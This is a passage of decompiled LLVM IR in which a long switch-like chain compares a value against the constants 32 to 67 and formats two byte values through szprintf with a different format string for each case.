dec_label_pc_b380:                                ; preds = %dec_label_pc_b34c, %dec_label_pc_b358
  %v7_b384 = icmp eq i32 %v2_acd8, 32
  br i1 %v7_b384, label %dec_label_pc_b38c, label %dec_label_pc_b3b4

dec_label_pc_b38c:                                ; preds = %dec_label_pc_b380
  %v2_b38c = ptrtoint i32* %stack_var_-36 to i32
  %v3_b398 = load i8, i8* @global_var_28589.78, align 1
  %v3_b3a4 = load i8, i8* @global_var_2858a.79, align 1
  %v4_b3b0 = sext i8 %v3_b398 to i32
  %v6_b3b0 = sext i8 %v3_b3a4 to i32
  %v8_b3b0 = call i32 @szprintf(i32 %v2_b38c, i32 ptrtoint ([11 x i8]* @global_var_1e0f0.145 to i32), i32 %v4_b3b0, i32 %v6_b3b0, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b3b4

dec_label_pc_b3b4:                                ; preds = %dec_label_pc_b380, %dec_label_pc_b38c
  %v7_b3b8 = icmp eq i32 %v2_acd8, 33
  br i1 %v7_b3b8, label %dec_label_pc_b3c0, label %dec_label_pc_b3e8

dec_label_pc_b3c0:                                ; preds = %dec_label_pc_b3b4
  %v2_b3c0 = ptrtoint i32* %stack_var_-36 to i32
  %v3_b3cc = load i8, i8* @global_var_28589.78, align 1
  %v3_b3d8 = load i8, i8* @global_var_2858a.79, align 1
  %v4_b3e4 = sext i8 %v3_b3cc to i32
  %v6_b3e4 = sext i8 %v3_b3d8 to i32
  %v8_b3e4 = call i32 @szprintf(i32 %v2_b3c0, i32 ptrtoint ([12 x i8]* @global_var_1e0fc.147 to i32), i32 %v4_b3e4, i32 %v6_b3e4, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b3e8

dec_label_pc_b3e8:                                ; preds = %dec_label_pc_b3b4, %dec_label_pc_b3c0
  %v7_b3ec = icmp eq i32 %v2_acd8, 34
  br i1 %v7_b3ec, label %dec_label_pc_b3f4, label %dec_label_pc_b41c

dec_label_pc_b3f4:                                ; preds = %dec_label_pc_b3e8
  %v2_b3f4 = ptrtoint i32* %stack_var_-36 to i32
  %v3_b400 = load i8, i8* @global_var_28589.78, align 1
  %v3_b40c = load i8, i8* @global_var_2858a.79, align 1
  %v4_b418 = sext i8 %v3_b400 to i32
  %v6_b418 = sext i8 %v3_b40c to i32
  %v8_b418 = call i32 @szprintf(i32 %v2_b3f4, i32 ptrtoint ([12 x i8]* @global_var_1e108.149 to i32), i32 %v4_b418, i32 %v6_b418, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b41c

dec_label_pc_b41c:                                ; preds = %dec_label_pc_b3e8, %dec_label_pc_b3f4
  %v7_b420 = icmp eq i32 %v2_acd8, 35
  br i1 %v7_b420, label %dec_label_pc_b428, label %dec_label_pc_b450

dec_label_pc_b428:                                ; preds = %dec_label_pc_b41c
  %v2_b428 = ptrtoint i32* %stack_var_-36 to i32
  %v3_b434 = load i8, i8* @global_var_28589.78, align 1
  %v3_b440 = load i8, i8* @global_var_2858a.79, align 1
  %v4_b44c = sext i8 %v3_b434 to i32
  %v6_b44c = sext i8 %v3_b440 to i32
  %v8_b44c = call i32 @szprintf(i32 %v2_b428, i32 ptrtoint ([12 x i8]* @global_var_1e114.151 to i32), i32 %v4_b44c, i32 %v6_b44c, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b450

dec_label_pc_b450:                                ; preds = %dec_label_pc_b41c, %dec_label_pc_b428
  %v7_b454 = icmp eq i32 %v2_acd8, 36
  br i1 %v7_b454, label %dec_label_pc_b45c, label %dec_label_pc_b484

dec_label_pc_b45c:                                ; preds = %dec_label_pc_b450
  %v2_b45c = ptrtoint i32* %stack_var_-36 to i32
  %v3_b468 = load i8, i8* @global_var_28589.78, align 1
  %v3_b474 = load i8, i8* @global_var_2858a.79, align 1
  %v4_b480 = sext i8 %v3_b468 to i32
  %v6_b480 = sext i8 %v3_b474 to i32
  %v8_b480 = call i32 @szprintf(i32 %v2_b45c, i32 ptrtoint ([12 x i8]* @global_var_1e120.153 to i32), i32 %v4_b480, i32 %v6_b480, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b484

dec_label_pc_b484:                                ; preds = %dec_label_pc_b450, %dec_label_pc_b45c
  %v7_b488 = icmp eq i32 %v2_acd8, 37
  br i1 %v7_b488, label %dec_label_pc_b490, label %dec_label_pc_b4b8

dec_label_pc_b490:                                ; preds = %dec_label_pc_b484
  %v2_b490 = ptrtoint i32* %stack_var_-36 to i32
  %v3_b49c = load i8, i8* @global_var_28589.78, align 1
  %v3_b4a8 = load i8, i8* @global_var_2858a.79, align 1
  %v4_b4b4 = sext i8 %v3_b49c to i32
  %v6_b4b4 = sext i8 %v3_b4a8 to i32
  %v8_b4b4 = call i32 @szprintf(i32 %v2_b490, i32 ptrtoint ([12 x i8]* @global_var_1e12c.155 to i32), i32 %v4_b4b4, i32 %v6_b4b4, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b4b8

dec_label_pc_b4b8:                                ; preds = %dec_label_pc_b484, %dec_label_pc_b490
  %v7_b4bc = icmp eq i32 %v2_acd8, 38
  br i1 %v7_b4bc, label %dec_label_pc_b4c4, label %dec_label_pc_b4ec

dec_label_pc_b4c4:                                ; preds = %dec_label_pc_b4b8
  %v2_b4c4 = ptrtoint i32* %stack_var_-36 to i32
  %v3_b4d0 = load i8, i8* @global_var_28589.78, align 1
  %v3_b4dc = load i8, i8* @global_var_2858a.79, align 1
  %v4_b4e8 = sext i8 %v3_b4d0 to i32
  %v6_b4e8 = sext i8 %v3_b4dc to i32
  %v8_b4e8 = call i32 @szprintf(i32 %v2_b4c4, i32 ptrtoint ([13 x i8]* @global_var_1e138.157 to i32), i32 %v4_b4e8, i32 %v6_b4e8, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b4ec

dec_label_pc_b4ec:                                ; preds = %dec_label_pc_b4b8, %dec_label_pc_b4c4
  %v7_b4f0 = icmp eq i32 %v2_acd8, 39
  br i1 %v7_b4f0, label %dec_label_pc_b4f8, label %dec_label_pc_b520

dec_label_pc_b4f8:                                ; preds = %dec_label_pc_b4ec
  %v2_b4f8 = ptrtoint i32* %stack_var_-36 to i32
  %v3_b504 = load i8, i8* @global_var_28589.78, align 1
  %v3_b510 = load i8, i8* @global_var_2858a.79, align 1
  %v4_b51c = sext i8 %v3_b504 to i32
  %v6_b51c = sext i8 %v3_b510 to i32
  %v8_b51c = call i32 @szprintf(i32 %v2_b4f8, i32 ptrtoint ([13 x i8]* @global_var_1e148.159 to i32), i32 %v4_b51c, i32 %v6_b51c, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b520

dec_label_pc_b520:                                ; preds = %dec_label_pc_b4ec, %dec_label_pc_b4f8
  %v7_b524 = icmp eq i32 %v2_acd8, 40
  br i1 %v7_b524, label %dec_label_pc_b52c, label %dec_label_pc_b554

dec_label_pc_b52c:                                ; preds = %dec_label_pc_b520
  %v2_b52c = ptrtoint i32* %stack_var_-36 to i32
  %v3_b538 = load i8, i8* @global_var_28589.78, align 1
  %v3_b544 = load i8, i8* @global_var_2858a.79, align 1
  %v4_b550 = sext i8 %v3_b538 to i32
  %v6_b550 = sext i8 %v3_b544 to i32
  %v8_b550 = call i32 @szprintf(i32 %v2_b52c, i32 ptrtoint ([13 x i8]* @global_var_1e138.157 to i32), i32 %v4_b550, i32 %v6_b550, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b554

dec_label_pc_b554:                                ; preds = %dec_label_pc_b520, %dec_label_pc_b52c
  %v7_b558 = icmp eq i32 %v2_acd8, 41
  br i1 %v7_b558, label %dec_label_pc_b560, label %dec_label_pc_b588

dec_label_pc_b560:                                ; preds = %dec_label_pc_b554
  %v2_b560 = ptrtoint i32* %stack_var_-36 to i32
  %v3_b56c = load i8, i8* @global_var_28589.78, align 1
  %v3_b578 = load i8, i8* @global_var_2858a.79, align 1
  %v4_b584 = sext i8 %v3_b56c to i32
  %v6_b584 = sext i8 %v3_b578 to i32
  %v8_b584 = call i32 @szprintf(i32 %v2_b560, i32 ptrtoint ([11 x i8]* @global_var_1e158.161 to i32), i32 %v4_b584, i32 %v6_b584, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b588

dec_label_pc_b588:                                ; preds = %dec_label_pc_b554, %dec_label_pc_b560
  %v7_b58c = icmp eq i32 %v2_acd8, 42
  br i1 %v7_b58c, label %dec_label_pc_b594, label %dec_label_pc_b5bc

dec_label_pc_b594:                                ; preds = %dec_label_pc_b588
  %v2_b594 = ptrtoint i32* %stack_var_-36 to i32
  %v3_b5a0 = load i8, i8* @global_var_28589.78, align 1
  %v3_b5ac = load i8, i8* @global_var_2858a.79, align 1
  %v4_b5b8 = sext i8 %v3_b5a0 to i32
  %v6_b5b8 = sext i8 %v3_b5ac to i32
  %v8_b5b8 = call i32 @szprintf(i32 %v2_b594, i32 ptrtoint ([12 x i8]* @global_var_1e164.163 to i32), i32 %v4_b5b8, i32 %v6_b5b8, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b5bc

dec_label_pc_b5bc:                                ; preds = %dec_label_pc_b588, %dec_label_pc_b594
  %v7_b5c0 = icmp eq i32 %v2_acd8, 43
  br i1 %v7_b5c0, label %dec_label_pc_b5c8, label %dec_label_pc_b5f0

dec_label_pc_b5c8:                                ; preds = %dec_label_pc_b5bc
  %v2_b5c8 = ptrtoint i32* %stack_var_-36 to i32
  %v3_b5d4 = load i8, i8* @global_var_28589.78, align 1
  %v3_b5e0 = load i8, i8* @global_var_2858a.79, align 1
  %v4_b5ec = sext i8 %v3_b5d4 to i32
  %v6_b5ec = sext i8 %v3_b5e0 to i32
  %v8_b5ec = call i32 @szprintf(i32 %v2_b5c8, i32 ptrtoint ([13 x i8]* @global_var_1e170.165 to i32), i32 %v4_b5ec, i32 %v6_b5ec, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b5f0

dec_label_pc_b5f0:                                ; preds = %dec_label_pc_b5bc, %dec_label_pc_b5c8
  %v7_b5f4 = icmp eq i32 %v2_acd8, 44
  br i1 %v7_b5f4, label %dec_label_pc_b5fc, label %dec_label_pc_b624

dec_label_pc_b5fc:                                ; preds = %dec_label_pc_b5f0
  %v2_b5fc = ptrtoint i32* %stack_var_-36 to i32
  %v3_b608 = load i8, i8* @global_var_28589.78, align 1
  %v3_b614 = load i8, i8* @global_var_2858a.79, align 1
  %v4_b620 = sext i8 %v3_b608 to i32
  %v6_b620 = sext i8 %v3_b614 to i32
  %v8_b620 = call i32 @szprintf(i32 %v2_b5fc, i32 ptrtoint ([12 x i8]* @global_var_1e180.167 to i32), i32 %v4_b620, i32 %v6_b620, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b624

dec_label_pc_b624:                                ; preds = %dec_label_pc_b5f0, %dec_label_pc_b5fc
  %v7_b628 = icmp eq i32 %v2_acd8, 45
  br i1 %v7_b628, label %dec_label_pc_b630, label %dec_label_pc_b658

dec_label_pc_b630:                                ; preds = %dec_label_pc_b624
  %v2_b630 = ptrtoint i32* %stack_var_-36 to i32
  %v3_b63c = load i8, i8* @global_var_28589.78, align 1
  %v3_b648 = load i8, i8* @global_var_2858a.79, align 1
  %v4_b654 = sext i8 %v3_b63c to i32
  %v6_b654 = sext i8 %v3_b648 to i32
  %v8_b654 = call i32 @szprintf(i32 %v2_b630, i32 ptrtoint ([13 x i8]* @global_var_1e18c.169 to i32), i32 %v4_b654, i32 %v6_b654, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b658

dec_label_pc_b658:                                ; preds = %dec_label_pc_b624, %dec_label_pc_b630
  %v7_b65c = icmp eq i32 %v2_acd8, 46
  br i1 %v7_b65c, label %dec_label_pc_b664, label %dec_label_pc_b68c

dec_label_pc_b664:                                ; preds = %dec_label_pc_b658
  %v2_b664 = ptrtoint i32* %stack_var_-36 to i32
  %v3_b670 = load i8, i8* @global_var_28589.78, align 1
  %v3_b67c = load i8, i8* @global_var_2858a.79, align 1
  %v4_b688 = sext i8 %v3_b670 to i32
  %v6_b688 = sext i8 %v3_b67c to i32
  %v8_b688 = call i32 @szprintf(i32 %v2_b664, i32 ptrtoint ([13 x i8]* @global_var_1e19c.171 to i32), i32 %v4_b688, i32 %v6_b688, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b68c

dec_label_pc_b68c:                                ; preds = %dec_label_pc_b658, %dec_label_pc_b664
  %v7_b690 = icmp eq i32 %v2_acd8, 47
  br i1 %v7_b690, label %dec_label_pc_b698, label %dec_label_pc_b6c0

dec_label_pc_b698:                                ; preds = %dec_label_pc_b68c
  %v2_b698 = ptrtoint i32* %stack_var_-36 to i32
  %v3_b6a4 = load i8, i8* @global_var_28589.78, align 1
  %v3_b6b0 = load i8, i8* @global_var_2858a.79, align 1
  %v4_b6bc = sext i8 %v3_b6a4 to i32
  %v6_b6bc = sext i8 %v3_b6b0 to i32
  %v8_b6bc = call i32 @szprintf(i32 %v2_b698, i32 ptrtoint ([13 x i8]* @global_var_1e1ac.173 to i32), i32 %v4_b6bc, i32 %v6_b6bc, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b6c0

dec_label_pc_b6c0:                                ; preds = %dec_label_pc_b68c, %dec_label_pc_b698
  %v7_b6c4 = icmp eq i32 %v2_acd8, 48
  br i1 %v7_b6c4, label %dec_label_pc_b6cc, label %dec_label_pc_b6f4

dec_label_pc_b6cc:                                ; preds = %dec_label_pc_b6c0
  %v2_b6cc = ptrtoint i32* %stack_var_-36 to i32
  %v3_b6d8 = load i8, i8* @global_var_28589.78, align 1
  %v3_b6e4 = load i8, i8* @global_var_2858a.79, align 1
  %v4_b6f0 = sext i8 %v3_b6d8 to i32
  %v6_b6f0 = sext i8 %v3_b6e4 to i32
  %v8_b6f0 = call i32 @szprintf(i32 %v2_b6cc, i32 ptrtoint ([12 x i8]* @global_var_1e1bc.175 to i32), i32 %v4_b6f0, i32 %v6_b6f0, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b6f4

dec_label_pc_b6f4:                                ; preds = %dec_label_pc_b6c0, %dec_label_pc_b6cc
  %v7_b6f8 = icmp eq i32 %v2_acd8, 49
  br i1 %v7_b6f8, label %dec_label_pc_b700, label %dec_label_pc_b728

dec_label_pc_b700:                                ; preds = %dec_label_pc_b6f4
  %v2_b700 = ptrtoint i32* %stack_var_-36 to i32
  %v3_b70c = load i8, i8* @global_var_28589.78, align 1
  %v3_b718 = load i8, i8* @global_var_2858a.79, align 1
  %v4_b724 = sext i8 %v3_b70c to i32
  %v6_b724 = sext i8 %v3_b718 to i32
  %v8_b724 = call i32 @szprintf(i32 %v2_b700, i32 ptrtoint ([12 x i8]* @global_var_1e1c8.177 to i32), i32 %v4_b724, i32 %v6_b724, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b728

dec_label_pc_b728:                                ; preds = %dec_label_pc_b6f4, %dec_label_pc_b700
  %v7_b72c = icmp eq i32 %v2_acd8, 50
  br i1 %v7_b72c, label %dec_label_pc_b734, label %dec_label_pc_b75c

dec_label_pc_b734:                                ; preds = %dec_label_pc_b728
  %v2_b734 = ptrtoint i32* %stack_var_-36 to i32
  %v3_b740 = load i8, i8* @global_var_28589.78, align 1
  %v3_b74c = load i8, i8* @global_var_2858a.79, align 1
  %v4_b758 = sext i8 %v3_b740 to i32
  %v6_b758 = sext i8 %v3_b74c to i32
  %v8_b758 = call i32 @szprintf(i32 %v2_b734, i32 ptrtoint ([12 x i8]* @global_var_1e1d4.179 to i32), i32 %v4_b758, i32 %v6_b758, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b75c

dec_label_pc_b75c:                                ; preds = %dec_label_pc_b728, %dec_label_pc_b734
  %v7_b760 = icmp eq i32 %v2_acd8, 51
  br i1 %v7_b760, label %dec_label_pc_b768, label %dec_label_pc_b790

dec_label_pc_b768:                                ; preds = %dec_label_pc_b75c
  %v2_b768 = ptrtoint i32* %stack_var_-36 to i32
  %v3_b774 = load i8, i8* @global_var_28589.78, align 1
  %v3_b780 = load i8, i8* @global_var_2858a.79, align 1
  %v4_b78c = sext i8 %v3_b774 to i32
  %v6_b78c = sext i8 %v3_b780 to i32
  %v8_b78c = call i32 @szprintf(i32 %v2_b768, i32 ptrtoint ([13 x i8]* @global_var_1e1e0.181 to i32), i32 %v4_b78c, i32 %v6_b78c, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b790

dec_label_pc_b790:                                ; preds = %dec_label_pc_b75c, %dec_label_pc_b768
  %v7_b794 = icmp eq i32 %v2_acd8, 52
  br i1 %v7_b794, label %dec_label_pc_b79c, label %dec_label_pc_b7c4

dec_label_pc_b79c:                                ; preds = %dec_label_pc_b790
  %v2_b79c = ptrtoint i32* %stack_var_-36 to i32
  %v3_b7a8 = load i8, i8* @global_var_28589.78, align 1
  %v3_b7b4 = load i8, i8* @global_var_2858a.79, align 1
  %v4_b7c0 = sext i8 %v3_b7a8 to i32
  %v6_b7c0 = sext i8 %v3_b7b4 to i32
  %v8_b7c0 = call i32 @szprintf(i32 %v2_b79c, i32 ptrtoint ([13 x i8]* @global_var_1e1f0.183 to i32), i32 %v4_b7c0, i32 %v6_b7c0, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b7c4

dec_label_pc_b7c4:                                ; preds = %dec_label_pc_b790, %dec_label_pc_b79c
  %v7_b7c8 = icmp eq i32 %v2_acd8, 53
  br i1 %v7_b7c8, label %dec_label_pc_b7d0, label %dec_label_pc_b7f8

dec_label_pc_b7d0:                                ; preds = %dec_label_pc_b7c4
  %v2_b7d0 = ptrtoint i32* %stack_var_-36 to i32
  %v3_b7dc = load i8, i8* @global_var_28589.78, align 1
  %v3_b7e8 = load i8, i8* @global_var_2858a.79, align 1
  %v4_b7f4 = sext i8 %v3_b7dc to i32
  %v6_b7f4 = sext i8 %v3_b7e8 to i32
  %v8_b7f4 = call i32 @szprintf(i32 %v2_b7d0, i32 ptrtoint ([14 x i8]* @global_var_1e200.185 to i32), i32 %v4_b7f4, i32 %v6_b7f4, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b7f8

dec_label_pc_b7f8:                                ; preds = %dec_label_pc_b7c4, %dec_label_pc_b7d0
  %v7_b7fc = icmp eq i32 %v2_acd8, 54
  br i1 %v7_b7fc, label %dec_label_pc_b804, label %dec_label_pc_b82c

dec_label_pc_b804:                                ; preds = %dec_label_pc_b7f8
  %v2_b804 = ptrtoint i32* %stack_var_-36 to i32
  %v3_b810 = load i8, i8* @global_var_28589.78, align 1
  %v3_b81c = load i8, i8* @global_var_2858a.79, align 1
  %v4_b828 = sext i8 %v3_b810 to i32
  %v6_b828 = sext i8 %v3_b81c to i32
  %v8_b828 = call i32 @szprintf(i32 %v2_b804, i32 ptrtoint ([13 x i8]* @global_var_1e210.187 to i32), i32 %v4_b828, i32 %v6_b828, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b82c

dec_label_pc_b82c:                                ; preds = %dec_label_pc_b7f8, %dec_label_pc_b804
  %v7_b830 = icmp eq i32 %v2_acd8, 55
  br i1 %v7_b830, label %dec_label_pc_b838, label %dec_label_pc_b860

dec_label_pc_b838:                                ; preds = %dec_label_pc_b82c
  %v2_b838 = ptrtoint i32* %stack_var_-36 to i32
  %v3_b844 = load i8, i8* @global_var_28589.78, align 1
  %v3_b850 = load i8, i8* @global_var_2858a.79, align 1
  %v4_b85c = sext i8 %v3_b844 to i32
  %v6_b85c = sext i8 %v3_b850 to i32
  %v8_b85c = call i32 @szprintf(i32 %v2_b838, i32 ptrtoint ([14 x i8]* @global_var_1e220.189 to i32), i32 %v4_b85c, i32 %v6_b85c, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b860

dec_label_pc_b860:                                ; preds = %dec_label_pc_b82c, %dec_label_pc_b838
  %v7_b864 = icmp eq i32 %v2_acd8, 56
  br i1 %v7_b864, label %dec_label_pc_b86c, label %dec_label_pc_b894

dec_label_pc_b86c:                                ; preds = %dec_label_pc_b860
  %v2_b86c = ptrtoint i32* %stack_var_-36 to i32
  %v3_b878 = load i8, i8* @global_var_28589.78, align 1
  %v3_b884 = load i8, i8* @global_var_2858a.79, align 1
  %v4_b890 = sext i8 %v3_b878 to i32
  %v6_b890 = sext i8 %v3_b884 to i32
  %v8_b890 = call i32 @szprintf(i32 %v2_b86c, i32 ptrtoint ([14 x i8]* @global_var_1e230.191 to i32), i32 %v4_b890, i32 %v6_b890, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b894

dec_label_pc_b894:                                ; preds = %dec_label_pc_b860, %dec_label_pc_b86c
  %v7_b898 = icmp eq i32 %v2_acd8, 57
  br i1 %v7_b898, label %dec_label_pc_b8a0, label %dec_label_pc_b8c8

dec_label_pc_b8a0:                                ; preds = %dec_label_pc_b894
  %v2_b8a0 = ptrtoint i32* %stack_var_-36 to i32
  %v3_b8ac = load i8, i8* @global_var_28589.78, align 1
  %v3_b8b8 = load i8, i8* @global_var_2858a.79, align 1
  %v4_b8c4 = sext i8 %v3_b8ac to i32
  %v6_b8c4 = sext i8 %v3_b8b8 to i32
  %v8_b8c4 = call i32 @szprintf(i32 %v2_b8a0, i32 ptrtoint ([13 x i8]* @global_var_1e240.193 to i32), i32 %v4_b8c4, i32 %v6_b8c4, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b8c8

dec_label_pc_b8c8:                                ; preds = %dec_label_pc_b894, %dec_label_pc_b8a0
  %v7_b8cc = icmp eq i32 %v2_acd8, 58
  br i1 %v7_b8cc, label %dec_label_pc_b8d4, label %dec_label_pc_b8fc

dec_label_pc_b8d4:                                ; preds = %dec_label_pc_b8c8
  %v2_b8d4 = ptrtoint i32* %stack_var_-36 to i32
  %v3_b8e0 = load i8, i8* @global_var_28589.78, align 1
  %v3_b8ec = load i8, i8* @global_var_2858a.79, align 1
  %v4_b8f8 = sext i8 %v3_b8e0 to i32
  %v6_b8f8 = sext i8 %v3_b8ec to i32
  %v8_b8f8 = call i32 @szprintf(i32 %v2_b8d4, i32 ptrtoint ([13 x i8]* @global_var_1e250.195 to i32), i32 %v4_b8f8, i32 %v6_b8f8, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b8fc

dec_label_pc_b8fc:                                ; preds = %dec_label_pc_b8c8, %dec_label_pc_b8d4
  %v7_b900 = icmp eq i32 %v2_acd8, 59
  br i1 %v7_b900, label %dec_label_pc_b908, label %dec_label_pc_b930

dec_label_pc_b908:                                ; preds = %dec_label_pc_b8fc
  %v2_b908 = ptrtoint i32* %stack_var_-36 to i32
  %v3_b914 = load i8, i8* @global_var_28589.78, align 1
  %v3_b920 = load i8, i8* @global_var_2858a.79, align 1
  %v4_b92c = sext i8 %v3_b914 to i32
  %v6_b92c = sext i8 %v3_b920 to i32
  %v8_b92c = call i32 @szprintf(i32 %v2_b908, i32 ptrtoint ([13 x i8]* @global_var_1e260.197 to i32), i32 %v4_b92c, i32 %v6_b92c, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b930

dec_label_pc_b930:                                ; preds = %dec_label_pc_b8fc, %dec_label_pc_b908
  %v7_b934 = icmp eq i32 %v2_acd8, 60
  br i1 %v7_b934, label %dec_label_pc_b93c, label %dec_label_pc_b964

dec_label_pc_b93c:                                ; preds = %dec_label_pc_b930
  %v2_b93c = ptrtoint i32* %stack_var_-36 to i32
  %v3_b948 = load i8, i8* @global_var_28589.78, align 1
  %v3_b954 = load i8, i8* @global_var_2858a.79, align 1
  %v4_b960 = sext i8 %v3_b948 to i32
  %v6_b960 = sext i8 %v3_b954 to i32
  %v8_b960 = call i32 @szprintf(i32 %v2_b93c, i32 ptrtoint ([13 x i8]* @global_var_1e270.199 to i32), i32 %v4_b960, i32 %v6_b960, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b964

dec_label_pc_b964:                                ; preds = %dec_label_pc_b930, %dec_label_pc_b93c
  %v7_b968 = icmp eq i32 %v2_acd8, 61
  br i1 %v7_b968, label %dec_label_pc_b970, label %dec_label_pc_b998

dec_label_pc_b970:                                ; preds = %dec_label_pc_b964
  %v2_b970 = ptrtoint i32* %stack_var_-36 to i32
  %v3_b97c = load i8, i8* @global_var_28589.78, align 1
  %v3_b988 = load i8, i8* @global_var_2858a.79, align 1
  %v4_b994 = sext i8 %v3_b97c to i32
  %v6_b994 = sext i8 %v3_b988 to i32
  %v8_b994 = call i32 @szprintf(i32 %v2_b970, i32 ptrtoint ([13 x i8]* @global_var_1e280.201 to i32), i32 %v4_b994, i32 %v6_b994, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b998

dec_label_pc_b998:                                ; preds = %dec_label_pc_b964, %dec_label_pc_b970
  %v7_b99c = icmp eq i32 %v2_acd8, 62
  br i1 %v7_b99c, label %dec_label_pc_b9a4, label %dec_label_pc_b9cc

dec_label_pc_b9a4:                                ; preds = %dec_label_pc_b998
  %v2_b9a4 = ptrtoint i32* %stack_var_-36 to i32
  %v3_b9b0 = load i8, i8* @global_var_28589.78, align 1
  %v3_b9bc = load i8, i8* @global_var_2858a.79, align 1
  %v4_b9c8 = sext i8 %v3_b9b0 to i32
  %v6_b9c8 = sext i8 %v3_b9bc to i32
  %v8_b9c8 = call i32 @szprintf(i32 %v2_b9a4, i32 ptrtoint ([13 x i8]* @global_var_1e290.203 to i32), i32 %v4_b9c8, i32 %v6_b9c8, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b9cc

dec_label_pc_b9cc:                                ; preds = %dec_label_pc_b998, %dec_label_pc_b9a4
  %v7_b9d0 = icmp eq i32 %v2_acd8, 63
  br i1 %v7_b9d0, label %dec_label_pc_b9d8, label %dec_label_pc_ba00

dec_label_pc_b9d8:                                ; preds = %dec_label_pc_b9cc
  %v2_b9d8 = ptrtoint i32* %stack_var_-36 to i32
  %v3_b9e4 = load i8, i8* @global_var_28589.78, align 1
  %v3_b9f0 = load i8, i8* @global_var_2858a.79, align 1
  %v4_b9fc = sext i8 %v3_b9e4 to i32
  %v6_b9fc = sext i8 %v3_b9f0 to i32
  %v8_b9fc = call i32 @szprintf(i32 %v2_b9d8, i32 ptrtoint ([13 x i8]* @global_var_1e2a0.205 to i32), i32 %v4_b9fc, i32 %v6_b9fc, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_ba00

dec_label_pc_ba00:                                ; preds = %dec_label_pc_b9cc, %dec_label_pc_b9d8
  %v7_ba04 = icmp eq i32 %v2_acd8, 64
  br i1 %v7_ba04, label %dec_label_pc_ba0c, label %dec_label_pc_ba34

dec_label_pc_ba0c:                                ; preds = %dec_label_pc_ba00
  %v2_ba0c = ptrtoint i32* %stack_var_-36 to i32
  %v3_ba18 = load i8, i8* @global_var_28589.78, align 1
  %v3_ba24 = load i8, i8* @global_var_2858a.79, align 1
  %v4_ba30 = sext i8 %v3_ba18 to i32
  %v6_ba30 = sext i8 %v3_ba24 to i32
  %v8_ba30 = call i32 @szprintf(i32 %v2_ba0c, i32 ptrtoint ([13 x i8]* @global_var_1e2b0.207 to i32), i32 %v4_ba30, i32 %v6_ba30, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_ba34

dec_label_pc_ba34:                                ; preds = %dec_label_pc_ba00, %dec_label_pc_ba0c
  %v7_ba38 = icmp eq i32 %v2_acd8, 65
  br i1 %v7_ba38, label %dec_label_pc_ba40, label %dec_label_pc_ba68

dec_label_pc_ba40:                                ; preds = %dec_label_pc_ba34
  %v2_ba40 = ptrtoint i32* %stack_var_-36 to i32
  %v3_ba4c = load i8, i8* @global_var_28589.78, align 1
  %v3_ba58 = load i8, i8* @global_var_2858a.79, align 1
  %v4_ba64 = sext i8 %v3_ba4c to i32
  %v6_ba64 = sext i8 %v3_ba58 to i32
  %v8_ba64 = call i32 @szprintf(i32 %v2_ba40, i32 ptrtoint ([13 x i8]* @global_var_1e2c0.209 to i32), i32 %v4_ba64, i32 %v6_ba64, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_ba68

dec_label_pc_ba68:                                ; preds = %dec_label_pc_ba34, %dec_label_pc_ba40
  %v7_ba6c = icmp eq i32 %v2_acd8, 66
  br i1 %v7_ba6c, label %dec_label_pc_ba74, label %dec_label_pc_ba9c

dec_label_pc_ba74:                                ; preds = %dec_label_pc_ba68
  %v2_ba74 = ptrtoint i32* %stack_var_-36 to i32
  %v3_ba80 = load i8, i8* @global_var_28589.78, align 1
  %v3_ba8c = load i8, i8* @global_var_2858a.79, align 1
  %v4_ba98 = sext i8 %v3_ba80 to i32
  %v6_ba98 = sext i8 %v3_ba8c to i32
  %v8_ba98 = call i32 @szprintf(i32 %v2_ba74, i32 ptrtoint ([13 x i8]* @global_var_1e2d0.211 to i32), i32 %v4_ba98, i32 %v6_ba98, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_ba9c

dec_label_pc_ba9c:                                ; preds = %dec_label_pc_ba68, %dec_label_pc_ba74
  %v7_baa0 = icmp eq i32 %v2_acd8, 67
  br i1 %v7_baa0, label %dec_label_pc_baa8, label %dec_label_pc_bad0

dec_label_pc_baa8:                                ; preds = %dec_label_pc_ba9c
  %v2_baa8 = ptrtoint i32* %stack_var_-36 to i32
  %v3_bab4 = load i8, i8* @global_var_28589.78, align 1
  %v3_bac0 = load i8, i8* @global_var_2858a.79, align 1
  %v4_bacc = sext i8 %v3_bab4 to i32
  %v6_bacc = sext i8 %v3_bac0 to i32
